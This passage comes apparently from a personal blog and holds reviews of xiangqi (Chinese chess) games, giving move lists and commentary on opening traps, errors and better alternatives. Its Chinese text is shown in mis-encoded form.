<li>ç‚®äºŒå¹³äº” é©¬ï¼˜è¿›ï¼—</li>
<li>é©¬äºŒè¿›ä¸‰ å’ï¼—è¿›ï¼‘</li>
<li>è½¦ä¸€å¹³äºŒ è½¦ï¼™å¹³ï¼˜</li>
<li>è½¦äºŒè¿›å…­ é©¬ï¼’è¿›ï¼“</li>
<li>å…µä¸ƒè¿›ä¸€ é©¬ï¼—è¿›ï¼–</li>
<li>é©¬å…«è¿›ä¸ƒ â€¦</li>
</ol>
<blockquote>
<p>åˆ°æ­¤, åŒæ–¹éƒ½ä¸€ç›´èµ°çš„æ­£ç€, è‡³æ­¤å½¢æˆå±€é¢ <strong>ä¸­ç‚®è¿‡æ²³è½¦äº’è¿›ä¸ƒå…µå¯¹å±é£é©¬å·¦é©¬ç›˜æ²³ â€” çº¢ä¸ƒè·¯é©¬</strong></p>
<p>åœ¨æ­¤å±€é¢ä¸‹, å¦‚æœæˆ‘æ‰§é»‘æ–¹, æˆ‘å¯èƒ½çš„èµ°æ³•æœ‰:</p>
<p>(1)å’7è¿›1 , ä¹Ÿå°±æ˜¯å®æˆ˜ä¸­çš„ä¸‹æ³•</p>
<p>(2)é©¬6è¿›7 , çº¢å¯å·¦é©¬ç›˜æ²³, è”åˆä¸­ç‚®æ”»å‡»ä¸­å’, å¹¶ä¸”é»‘é©¬6è¿›7å¯èƒ½æœ€å¤§çš„ä½œç”¨å°±æ˜¯æ¢æ‰ä¸­ç‚®, æ¯”è¾ƒäºæ­¥æ•°</p>
<p>(3)è±¡3è¿›5 , å¯ä»¥èµ°</p>
<p>(4)è±¡7è¿›5 , å¯ä»¥èµ°</p>
<p>(5)è½¦1è¿›1 , å¯ä»¥èµ°</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408164518149.png" alt="image-20250408164518149"></p>
<p>å®æˆ˜ä¸­çº¢æ–¹é‡‡ç”¨é©¬å…«è¿›ä¸ƒ, ç›®çš„æ˜¯ä¸è®©é»‘é©¬6è¿›4.</p>
<p>è¿™é‡Œçº¢ä¸Šé©¬çœ‹ä¼¼é¡¾æ­¤å¤±å½¼, å¼•è¯±é»‘æ–¹èµ°å’7è¿›1è¿™æ­¥æ£‹, æƒ³çš„æ˜¯è¹¬è½¦åŒæ—¶è¿‡å…µåå‡». ç„¶è€Œè¿™æ˜¯çº¢æ–¹è®¾è®¡çš„å¸ƒå±€é™·é˜±. </p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Z4411R7xh?vd_source=439dc31ae7afb665ee549d8bb78a939c&p=3&spm_id_from=333.788.videopod.episodes">2-2 é»‘ä¸»è¦å˜ä¾‹ï¼ˆä¸Šï¼‰â€“é»‘åŠ£å˜çš„æ”»å‡»_å“”å“©å“”å“©_bilibili</a></p>
<p>è¿™é‡Œé»‘æ–¹æ­£æ‰‹æ˜¯è¡¥ä¸€ä¸‹7è±¡æˆ–è€…3è±¡ ä¸­è·¯åŠ åšä¸€å±‚å°±å¯ä»¥ç ´è§£çº¢æ–¹çš„é™·é˜±, æˆ–è€…ä¸äºˆç†ç¬æŠ¬å³æ¨ªè½¦</p>
<p>å®æˆ˜é»‘æ–¹æ²¡æœ‰è¡¥è±¡, ç›´æ¥å†²7å’åå‡», æ—¶æœºå°šæœªæˆç†Ÿ, ç¼ºä¸€æ‰‹è¡¥è±¡ä½¿å¾—é»‘ä¸­è·¯æœ‰è¢«ç‚®è½°ç©ºå¤´æˆ–è€…è½¦æ€å’å°†å†›çš„é£é™©.</p>
</blockquote>
<ol start="6">
<li>é©¬å…«è¿›ä¸ƒ å’ï¼—è¿›ï¼‘</li>
</ol>
<blockquote>
<p>è¿™é‡Œé»‘æ–¹å†²7å’åå‡», æ—¶æœºå°šæœªæˆç†Ÿ, é»‘ä¸­é˜²å¹¶ä¸è¸å®</p>
</blockquote>
<ol start="7">
<li>è½¦äºŒå¹³å›› é©¬ï¼–è¿›ï¼˜</li>
</ol>
<blockquote>
<p>è¿™é‡Œè²Œä¼¼çº¢ä¸‰è·¯å…µé©¬ååˆ†è¢«åŠ¨,ç„¶è€Œå®é™…ä¸ç„¶, çº¢å¯ä»¥ç›´æ¥æŒºä¸‰å…µ, å¼ƒä¸‰é©¬. æ¥ä¸‹æ¥ç‚®è½°ä¸­å’</p>
<p>â€‹	å¦‚æœé»‘3é©¬æ¢æ‰ä¸­ç‚®, é‚£ä¹ˆè½¦æ€é©¬å¸¦å°†å†›, çº¢å·¦ç‚®æŠ½å›å¤±å­</p>
<p>â€‹	å¦‚æœé»‘3é©¬ä¸æ¢ä¸­ç‚®, é‚£ä¹ˆé»‘è¿˜éœ€è¦èŠ±è´¹ä¸€æ­¥æ£‹é€ƒèµ°7é©¬, çº¢æ–¹å¼ƒæ‰ä¸€é©¬å¾—åˆ°ä¸€ä¸ªç©ºå¤´ç‚®, çº¢å¤§ä¼˜</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408181346573.png" alt="image-20250408181346573"></p>
</blockquote>
<ol start="8">
<li>å…µä¸‰è¿›ä¸€ é©¬ï¼˜è¿›ï¼—</li>
<li>ç‚®äº”è¿›å›› é©¬ï¼“è¿›ï¼•</li>
<li>è½¦å››å¹³äº” ç‚®ï¼˜å¹³ï¼•</li>
</ol>
<blockquote>
<p>é»‘è¿™æ­¥å¹³ç‚®æ˜¯é”™æ‹›, æœ¬æ¥é»‘è¿˜æœ‰ç‚®8è¿›7çš„åå‡»æ‰‹æ®µ. ç”šè‡³ä¸å¦‚ç‚®2å¹³5.</p>
<p>å½“æ—¶é»‘æ–¹åº”è¯¥æ˜¯æƒ³å¹³8ç‚®äº®è½¦ç„¶åæŠ¬è½¦æ¬ºè´Ÿçº¢è½¦. åº”è¯¥æ˜¯æ€çº¢çœ¼äº†æƒ³ç«‹åˆ»å‘æ³„ä¸€ä¸‹.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408184749466.png" alt="image-20250408184749466"></p>
<p>é»‘æ–¹æ­£æ‰‹åº”è¯¥èµ°å£«6è¿›5, ä¿ç•™å³ç‚®å¹³ä¸­æˆ–è€…å·¦ç§»çš„å˜åŒ–. å¹¶å¯ä»¥åœ¨çº¢å³ç¿¼åå‡».</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408185345530.png" alt="image-20250408185345530"></p>
</blockquote>
<ol start="11">
<li>ç‚®å…«å¹³ä¸‰ ç‚®ï¼’è¿›ï¼‘</li>
</ol>
<blockquote>
<p>æ­¤å±€é¢ä¸‹, çº¢ä¸­è·¯ç©ºè™š, ä¸­è½¦ä¸èƒ½ç¦»å¼€, åªèƒ½é€€ä¸€æˆ–è€…é€€äºŒé¿è®©.</p>
<p>å½“æ—¶èµ°äº†é€€äºŒ, æ²¡èµ°é€€ä¸€, æ˜¯å®³æ€•é»‘è½¦8è¿›4å†æ‰, ä¼šå¸®åŠ©é»‘æ–¹å‡ºè½¦.</p>
<p>ç„¶è€Œå®é™…ä¸Šä¸ç”¨æ€•, çº¢å¯ç‚®è½°åº•è±¡ç„¶åå†é€€å››æ ¼æŒ¡</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408190114485.png" alt="image-20250408190114485"></p>
</blockquote>
<ol start="12">
<li><p>è½¦äº”é€€äºŒ ç‚®ï¼’é€€ï¼’</p>
</li>
<li><p>ç›¸ä¸ƒè¿›äº” ç‚®ï¼’å¹³ï¼•</p>
</li>
<li><p>è½¦äº”å¹³å›› è½¦ï¼‘å¹³ï¼’</p>
</li>
<li><p>è½¦ä¹è¿›ä¸€ è±¡ï¼—è¿›ï¼™</p>
</li>
</ol>
<blockquote>
<p>æ­¤æ—¶çº¢è½¦ä¹è¿›ä¸€, ç›®çš„æ˜¯å†å¹³å››æˆ–è€…å¹³å…­, éœ¸ç‹è½¦æ…åº•å£«</p>
<p>æ­¤æ—¶é»‘é£è±¡7è¿›9ä¹Ÿæ˜¯æ­£ç¡®çš„, æ—¢æ¶ˆé™¤äº†çº¢ç‚®ä¸‰è¿›ä¸ƒçš„æ‰‹æ®µ, ä¹Ÿç”¨8è·¯è½¦çœ‹ä½äº†6è·¯å£«</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408190613200.png" alt="image-20250408190613200"></p>
</blockquote>
<ol start="16">
<li>è½¦ä¹å¹³å…­ è½¦ï¼’è¿›ï¼–</li>
</ol>
<blockquote>
<p>æ­¤æ—¶çº¢è½¦ä¹å¹³å…­,æ‰“ç®—åœ¨å…­è·¯å éœ¸ç‹è½¦ç‹ ç‹ æ…è¿›å»</p>
<p>é»‘èµ°è½¦2è¿›6æ˜¯é”™æ‹›, é»‘2è·¯è½¦åº”è¯¥ç•™å®ˆåº•çº¿, æ­¤æ—¶é»‘å·²ç»æ— æ³•é˜»æ­¢æœ‰åŠ›çš„åå‡»äº†, éšä¾¿èµ°ç€ç©å§</p>
<p>å®æˆ˜é»‘èµ°è½¦2è¿›6, è€ƒè™‘åˆ°ä¸­è·¯æœ‰ä¸¤ç‚®, æƒ³è¦ä»ä¸­è·¯å‘èµ·æ”»åŠ¿, ç„¶è€Œè¿™æ˜¯é”™æ‹›. çº¢å¯ç›´æ¥è½¦å››å¹³å…­å éœ¸ç‹è½¦, æ— è§†é»‘åå‡», ç°åœ¨æ…ä¸‹å»å°±æ˜¯æ€. </p>
<p>å³ä½¿é»‘ä¸­ç‚®æ‰“å‡ºæ¥å°†ä¸€å†›, çº¢åªéœ€è¦é©¬æ¢æ‰ä¸­ç‚®, æ­¤æ—¶éœ¸ç‹è½¦æ…ä¸‹å»è¿˜æ˜¯æ€, é»‘æ¥ä¸åŠè½¦2å¹³5åƒé©¬, å¿…é¡»å…ˆå£«6è¿›5è¡¥ä¸€ä¸‹.é»‘æ–¹ç™½ç»™ä¸€ä¸ªç‚®, å¯ä»¥æŠ•é™äº†.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250408191621029.png" alt="image-20250408191621029"></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2025/04/08/delicious/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/08/delicious/" class="post-title-link" itemprop="url">é¡ºç‚®ç›´è½¦å¯¹æ¨ªè½¦ çº¢è¿‡æ²³è½¦ å¤ç›˜</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-04-08 03:00:00 / Modified: 03:36:21" itemprop="dateCreated datePublished" datetime="2025-04-08T03:00:00+08:00">2025-04-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="è±¡æ£‹å¤ç›˜-é¡ºç‚®ç›´è½¦å¯¹æ¨ªè½¦-çº¢è¿‡æ²³è½¦"><a href="#è±¡æ£‹å¤ç›˜-é¡ºç‚®ç›´è½¦å¯¹æ¨ªè½¦-çº¢è¿‡æ²³è½¦" class="headerlink" title="[è±¡æ£‹å¤ç›˜] é¡ºç‚®ç›´è½¦å¯¹æ¨ªè½¦ çº¢è¿‡æ²³è½¦"></a>[è±¡æ£‹å¤ç›˜] é¡ºç‚®ç›´è½¦å¯¹æ¨ªè½¦ çº¢è¿‡æ²³è½¦</h1><h2 id="å¯¹å±€è®°å½•"><a href="#å¯¹å±€è®°å½•" class="headerlink" title="å¯¹å±€è®°å½•"></a>å¯¹å±€è®°å½•</h2><ol>
<li><p>ç‚®äºŒå¹³äº” ç‚®ï¼˜å¹³ï¼•</p>
</li>
<li><p>é©¬äºŒè¿›ä¸‰ é©¬ï¼˜è¿›ï¼—</p>
</li>
<li><p>è½¦ä¸€å¹³äºŒ è½¦ï¼™è¿›ï¼‘</p>
</li>
<li><p>è½¦äºŒè¿›å…­ è½¦ï¼™å¹³ï¼”</p>
</li>
<li><p>ä»•å››è¿›äº” è½¦ï¼”è¿›ï¼—</p>
</li>
<li><p>é©¬å…«è¿›ä¹ è½¦ï¼”å¹³ï¼’</p>
</li>
<li><p>ç‚®å…«å¹³å…­ è½¦ï¼‘è¿›ï¼‘</p>
</li>
<li><p>ç‚®å…­è¿›äº” ç‚®ï¼•é€€ï¼‘</p>
</li>
<li><p>è½¦äºŒå¹³ä¸‰ ç‚®ï¼•å¹³ï¼—</p>
</li>
<li><p>è½¦ä¸‰å¹³å›› å£«ï¼”è¿›ï¼•</p>
</li>
<li><p>ç‚®å…­é€€ä¸‰ è½¦ï¼‘å¹³ï¼”</p>
</li>
<li><p>ç‚®å…­å¹³ä¸‰ ç‚®ï¼—è¿›ï¼”</p>
</li>
<li><p>å…µä¸‰è¿›ä¸€ è½¦ï¼”è¿›ï¼“</p>
</li>
<li><p>å…µä¸ƒè¿›ä¸€ è±¡ï¼“è¿›ï¼•</p>
</li>
<li><p>é©¬ä¹è¿›ä¸ƒ è½¦ï¼’é€€ï¼’</p>
</li>
<li><p>é©¬ä¸ƒè¿›äº” è½¦ï¼”å¹³ï¼–</p>
</li>
<li><p>å…µä¸‰è¿›ä¸€ è½¦ï¼–é€€ï¼‘</p>
</li>
<li><p>é©¬äº”è¿›å›› è½¦ï¼’é€€ï¼’</p>
</li>
<li><p>é©¬å››è¿›ä¸‰ å°†ï¼•å¹³ï¼”</p>
</li>
<li><p>ç‚®äº”å¹³å…­ ç‚®ï¼’é€€ï¼‘</p>
</li>
<li><p>å‰é©¬è¿›ä¸€ è±¡ï¼•è¿›ï¼—</p>
</li>
<li><p>é©¬ä¸‰è¿›å›› å°†ï¼”å¹³ï¼•</p>
</li>
<li><p>ç‚®å…­å¹³ä¸‰ è±¡ï¼—é€€ï¼•</p>
</li>
<li><p>ç›¸ä¸‰è¿›äº” ç‚®ï¼’å¹³ï¼“</p>
</li>
<li><p>ç›¸ä¸ƒè¿›ä¹ é©¬ï¼’è¿›ï¼“</p>
</li>
<li><p>å…µä¹è¿›ä¸€ è½¦ï¼’å¹³ï¼–</p>
</li>
</ol>
<h2 id="å¤ç›˜åˆ†æ"><a href="#å¤ç›˜åˆ†æ" class="headerlink" title="å¤ç›˜åˆ†æ"></a>å¤ç›˜åˆ†æ</h2><ol>
<li>ç‚®äºŒå¹³äº” ç‚®ï¼˜å¹³ï¼•</li>
<li>é©¬äºŒè¿›ä¸‰ é©¬ï¼˜è¿›ï¼—</li>
<li>è½¦ä¸€å¹³äºŒ è½¦ï¼™è¿›ï¼‘</li>
<li>è½¦äºŒè¿›å…­ è½¦ï¼™å¹³ï¼”</li>
<li>ä»•å››è¿›äº” è½¦ï¼”è¿›ï¼—</li>
<li>é©¬å…«è¿›ä¹  â€¦</li>
</ol>
<blockquote>
<p>åˆ°æ­¤åŒæ–¹èµ°çš„éƒ½æ˜¯æ­£ç€ï¼Œè¿™é‡Œçº¢èµ°äº†ä¸€è¾¹é©¬ï¼Œå®³æ€•ä¸Šæ­£é©¬è¢«é»‘è½¦å¹³æŠ </p>
<p>å®é™…ä¸Šçº¢å®Œå…¨å¯ä»¥ä¸Šæ­£é©¬ï¼Œå½“é»‘å¹³è½¦æŠ é©¬æ—¶çº¢å·¦ç‚®å·¡æ²³æš—ä¿é©¬ï¼Œå¦‚æœé»‘åƒé©¬, çº¢å°±æœ‰ç‚®å…«å¹³ä¸ƒæ‰“è½¦æ‰“åº•è±¡çš„åŒå“ç‚®</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408002348491.png" alt="image-20250408002348491"></p>
</blockquote>
<ol start="6">
<li>â€¦  è½¦ï¼”å¹³ï¼’</li>
</ol>
<blockquote>
<p>é»‘æ–¹å·¦è½¦æ€¥å¾—è·Ÿé©¬ä¸€æ ·é’»åˆ°çº¢æ–¹è¢«çªé‡Œï¼Œç›®çš„æ˜¯å•è¾¹å°é”</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408001958158.png" alt="image-20250408001958158"></p>
<p>é»‘æ–¹æ‰ç‚®åŒæ—¶å•è¾¹å°é”çº¢å·¦è½¦ã€‚ç„¶è€Œæ­¤æ—¶çº¢æ–¹ä¸æ€•å°é”ï¼Œå¯ä»¥ç›´æ¥å‡ºå·¦ç›´è½¦é‚€å…‘ï¼Œçœ‹ä¼¼ä¼šå¤šä¸¢ä¸€æ‰¹é©¬ï¼Œä½†æ˜¯å®é™…ä¸Šæ˜¯ä¸€ä¸ªå…ˆå¼ƒåå–ï¼Œé»‘å³ç‚®æ‰“å‡ºä½¿å¾—å·¦é©¬è„±æ ¹ï¼Œé»‘å·¦é©¬æ˜¯ä¸ªæ­»é©¬ã€‚æ¨æ¼”å¦‚ä¸‹ï¼š</p>
<p>7.è½¦ä¹å¹³å…« è½¦2è¿›1</p>
<p>8.é©¬ä¹é€€å…« ç‚®2è¿›7  ï¼Œè¿™é‡Œé»‘æ–¹å¤§æ¦‚ç‡ä¼šæ‰“é©¬ï¼Œå› ä¸ºé»‘è½¦å·²ç»åƒé‡Œè¿¢è¿¢æŠ¥åºŸäº†ï¼Œæ­¥æ•°ä¸Šè¡€äºï¼Œå› æ­¤æ€ä¸ªé©¬è·å–è¡¥å¿</p>
<p>9.è½¦äºŒå¹³ä¸‰ é©¬7é€€8 ï¼Œ å¦‚æœé»‘é©¬é€€çªå¿ƒåˆ™é“é—¨æ “é€Ÿæ‘†ï¼Œå¦‚æœé»‘é©¬7é€€9åˆ™çº¢ç‚®äº”è¿›å››ï¼Œå£«4è¿›5ï¼Œç‚®å…«è¿›å…­ï¼Œé»‘é©¬è¢«æ‰æ­»</p>
<p>10.è½¦ä¸‰è¿›ä¸‰ é©¬8è¿›9</p>
<p>11.ç‚®äº”è¿›å›› å£«4è¿›5</p>
<p>12.å¸…äº”å¹³å›› å°†5å¹³4 ï¼Œçº¢å€Ÿå¸…åšé“é—¨æ “ï¼Œé€¼è¿«é»‘å°†å‡ºé—¨</p>
<p>13.ç‚®äº”è¿›äºŒï¼Œè‡³æ­¤çº¢æ–¹å°‘ä¸€ä¸ªé©¬ï¼Œä½†æ˜¯é»‘æ–¹å®¶é‡Œå·²ç»è¢«æ‹†çƒ‚äº†ï¼Œé»‘æ–¹å®ˆä¸ä½</p>
<p>è¿™ä¸ªå¸ƒå±€é™·é˜±åœ¨ å¸ƒå±€ç–‘å½¢ä¸æ”»å‡» - ç¬¬ä¸€ç«  é¡ºæ‰‹ç‚®ç±» - ç¬¬10å±€ çªå‘å†·ç®­</p>
</blockquote>
<ol start="7">
<li>ç‚®å…«å¹³å…­ è½¦ï¼‘è¿›ï¼‘</li>
</ol>
<blockquote>
<p>è¿™é‡Œçº¢æ–¹çœ‹ä¼¼ç®€å•èº²äº†ä¸€æ­¥ç‚®ï¼Œå®é™…ä¸Šæ˜¯æƒ³å†è¿›äº”æ‰“é©¬ï¼Œè®©é»‘ä¸­å’å¤±å®ˆï¼Œå†æŠŠä¸­ç‚®æ‰“è¿‡å»</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408004926239.png" alt="image-20250408004926239"></p>
<p>æˆ‘å½“æ—¶æ²¡è€ƒè™‘åˆ°è¿™ç§æ„å›¾ï¼Œèµ°è½¦1è¿›1ï¼Œæ‰“ç®—å†å¹³6å‡ºè½¦ï¼Œå®é™…ä¸Šè¿™æ­¥å‡ºè½¦ä¹Ÿæ²¡æœ‰æ˜ç¡®çš„ç›®çš„ã€‚çº¢å¯ä»¥è½¦äºŒå¹³ä¸‰å‹é©¬ï¼Œåç»­å¯ä»¥å¥—ç‚®æˆ–è€…è¿›ä¸‰å…µæ”»å‡»é»‘7è·¯ï¼Œé»‘å·¦è½¦ä¸åœ¨å®¶é˜²å®ˆï¼Œé»‘7è·¯å°†ä¼šååˆ†è¢«åŠ¨ã€‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408005829699.png" alt="image-20250408005829699"></p>
<p>å› æ­¤æ­¤æ—¶é»‘æœ€å¥½åº”è¯¥èµ°å’7è¿›1ï¼Œæ­¤æ—¶å¦‚æœçº¢è¿˜è¦è½¦äºŒå¹³ä¸‰å‹é©¬ï¼Œé‚£ä¹ˆé»‘æ­£å¥½æœ‰æ—¶é—´æŠ¬æ¨ªè½¦å¹³4ç„¶åä¼ºæœºå·¡æ²³å®ˆä½ï¼Œçº¢æ¥ä¸åŠå‡å·¡æ²³ç‚®ï¼Œçº¢è¿›ä¸‰å…µä¹Ÿå¯ä»¥è¢«é»‘è½¦è±¡ä¸€èµ·å®ˆä½</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408010144595.png" alt="image-20250408010144595"></p>
<p>è¿˜æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œåœ¨ç¬¬6å›åˆè¿™é‡Œï¼Œé»‘æ–¹èƒ½å¦èµ°é©¬2è¿›1ï¼Ÿæ˜¾ç„¶ä¸èƒ½äº†ï¼Œé“ç†å’Œèµ°è½¦1è¿›1ä¸€æ ·ï¼Œç¼“ä¸€æ­¥æ£‹ä½¿å¾—7è·¯é©¬æ›´åŠ è¢«åŠ¨ï¼Œå¹¶ä¸”è½¦è¿˜æ²¡å‡ºæ¥æ²¡æ³•è¿‡å»æ”¯æ´ï¼Œæ›´åŠ è¢«åŠ¨</p>
</blockquote>
<ol start="8">
<li>ç‚®å…­è¿›äº” ç‚®ï¼•é€€ï¼‘</li>
</ol>
<blockquote>
<p>å½“çº¢ç‚®å…­è¿›äº”çªè¢­åï¼Œå“æˆ‘ä¸€è·³ã€‚</p>
<p>å½“æ—¶æƒ³äº†ä¸‰ä¸ªåº”å‘ï¼Œåˆ†åˆ«æ˜¯å£«4è¿›5&#x2F;è½¦1å¹³4&#x2F;ç‚®5é€€1</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408010835895.png" alt="image-20250408010835895"></p>
<p>ï¼ˆ1ï¼‰ å£«4è¿›5</p>
<ol start="8">
<li><p>ç‚®å…­è¿›äº” å£«4è¿›5</p>
</li>
<li><p>ç‚®å…­å¹³ä¸‰ ç‚®2å¹³7</p>
</li>
<li><p>è½¦äºŒå¹³ä¸‰ ç‚®7å¹³6</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408025634437.png" alt="image-20250408025634437"></p>
<p>åˆ°æ­¤é»‘æ–¹çš„å•è¾¹å°é”å¤±è´¥ï¼Œä¸­å’å’Œåº•è±¡éƒ½å¤±å®ˆï¼Œæ˜¾ç„¶çº¢ä¼˜</p>
<p>ï¼ˆ2ï¼‰è½¦1å¹³4</p>
<ol start="8">
<li><p>ç‚®å…­è¿›äº” è½¦1å¹³4</p>
</li>
<li><p>ç‚®å…­å¹³ä¸‰ ç‚®2å¹³7</p>
</li>
<li><p>è½¦äºŒå¹³ä¸‰ ç‚®7é€€1</p>
</li>
<li><p>ç‚®äº”è¿›å›› ç‚®7å¹³5</p>
</li>
<li><p>ç‚®äº”è¿›äºŒ è½¦2å¹³4 ï¼Œé“é—¨æ “æŠ¢ä¸€æ­¥å…ˆæ‰‹ï¼Œå½¢æˆéœ¸ç‹è½¦</p>
</li>
<li><p>ç›¸ä¸‰è¿›äº” å£«4è¿›5</p>
</li>
<li><p>é©¬ä¸‰é€€å›› åè½¦è¿›2 ï¼Œ ç›®çš„æ˜¯å…‘è½¦ä¿æŠ¤å’æ—</p>
</li>
<li><p>è½¦ä¸‰å¹³å…­ è½¦4é€€5</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408012359252.png" alt="image-20250408012359252"></p>
</li>
</ol>
<p>æ¥ä¸‹æ¥çº¢å‡ºç›´è½¦å…ˆæ‰‹æŠ“é©¬ï¼Œçº¢æœ‰å¤šä¸¤ä¸ªå…µçš„ä¼˜åŠ¿ã€‚ä½†æ˜¯æ„Ÿè§‰å¤§æ¦‚ç‡æ˜¯å’Œæ£‹äº†</p>
</blockquote>
<ol start="9">
<li>è½¦äºŒå¹³ä¸‰ ç‚®ï¼•å¹³ï¼—</li>
</ol>
<blockquote>
<p>çº¢æ–¹æ­¤æ—¶æ€å’å‹é©¬æ˜¯é”™ç€ï¼Œé»‘æ°å¥½å¯ä»¥ç‚®5å¹³7æ‰“è½¦ï¼Œçº¢æ–¹å¤±å…ˆ</p>
</blockquote>
<ol start="10">
<li>è½¦ä¸‰å¹³å›› å£«ï¼”è¿›ï¼•</li>
</ol>
<blockquote>
<p>çº¢è½¦ä¸‰å¹³å››ä¹‹åï¼Œæ­¤æ—¶æ˜¯é»‘æ–¹æœ€å…³é”®çš„ä¸€æ­¥æ£‹ï¼Œå½“æ—¶æƒ³åˆ°äº†å››ç§èµ°æ³•ï¼š</p>
<p>å£«4è¿›5&#x2F;é©¬7è¿›8&#x2F;ç‚®7è¿›5&#x2F;è½¦1å¹³4</p>
<p>å£«4è¿›5å¾ˆå¹³åº¸ï¼Œä¸è‡³äºå¤±è´¥ï¼Œä½†æ˜¯ä¾æ—§æ¶ˆæé˜²å¾¡</p>
<p>ç‚®7è¿›5&#x2F;é©¬7è¿›8&#x2F;è½¦1å¹³4éƒ½æ˜¯æœ‰åŠ›çš„åå‡»ï¼Œèƒ½å¤ŸåŒ–è§£çº¢æ–¹çš„æ”»åŠ¿</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408013139080.png" alt="image-20250408013139080"></p>
<p>ï¼ˆ1ï¼‰å£«4è¿›5ï¼Œç›®çš„æ˜¯é©±èµ¶çº¢ç‚®ï¼ŒåŒæ—¶è¡¥åšä¸­è·¯ã€‚ä¹Ÿæ­£æ˜¯å®æˆ˜ä¸­æˆ‘èµ°å‡ºçš„ä¸€æ­¥ã€‚ä½†æ˜¯æ²¡æœ‰å¯¹å†²çº¢æ–¹çš„æ”»åŠ¿ï¼Œä»ç„¶åœ¨æ¶ˆæé˜²å¾¡ã€‚</p>
<p>ï¼ˆ2ï¼‰é©¬7è¿›8ï¼Œå½“æ—¶æ²¡æ•¢èµ°è¿™ä¸€æ­¥ï¼Œå®³æ€•æ­¤æ­¥å¯¼è‡´ä¸­å’å¤±å®ˆï¼Œçº¢ç›´æ¥å¼ƒè½¦ç‚®äº”è¿›å››ï¼Œçœ¼è§å°±è¦é‡ç‚®æ€ï¼Œé»‘é©¬è¿˜å¯¹é€€å›ç›¯ä½çº¢åç‚®ï¼Œæˆ–è€…é»‘éœ€è¦ä¸Šå°†è§£æ€ã€‚</p>
<p>ç„¶è€Œé»‘æ–¹æ­¤æ—¶æœ‰ä¸€æ­¥å¦™æ‰‹å¯ä»¥è§£å†³çº¢æ–¹é‡ç‚®æ”»åŠ¿ï¼Œå¹¶è®©çº¢æ–¹ç«‹åˆ»è¢«åŠ¨ï¼š</p>
<p>ç‚®2è¿›1ï¼Œæ‹‰ä½çº¢æ–¹è½¦ç‚®ï¼Œè¦æ±‚å…‘ç‚®</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250408014655790.png" alt="image-20250408014655790"></p>
<p>å®æˆ˜æ²¡æœ‰çœ‹åˆ°è¿™æ­¥ï¼Œæ²¡èµ°å‡ºæ¥</p>
<p>ï¼ˆ3ï¼‰ç‚®7è¿›5ï¼Œå®æˆ˜ä¸­ä¹Ÿæ²¡èµ°å‡ºè¿™æ­¥æ¥ï¼Œä¹Ÿæ˜¯å¿Œæƒ®çº¢æ–¹ä¸­è·¯çš„å¼ºå¤§æ”»åŠ¿ï¼Œæ²¡çœ‹åˆ°ç‚®2è¿›1èƒ½å¤ŸåŒ–è§£é‡ç‚®æ€</p>
<ol start="10">
<li><p>è½¦ä¸‰å¹³å›› ç‚®7è¿›5</p>
</li>
<li><p>è½¦å››å¹³ä¸‰ ç‚®7è¿›3</p>
</li>
<li><p>é©¬ä¸‰è¿›å›› ç‚®7å¹³9</p>
</li>
<li><p>é©¬å››è¿›äº” é©¬7è¿›5</p>
</li>
<li><p>ç‚®äº”è¿›å›› ç‚®2è¿›1</p>
</li>
</ol>
<p>ï¼ˆ4ï¼‰è½¦1å¹³4ï¼Œå®æˆ˜ä¸­ä¹Ÿæ²¡èµ°å‡ºè¿™æ­¥æ¥ï¼Œè¿˜æ˜¯å¿Œæƒ®çº¢æ–¹ä¸­è·¯çš„å¼ºå¤§æ”»åŠ¿ï¼Œå®³æ€•è¢«å®‰ä¸Šç©ºå¤´ç‚®</p>
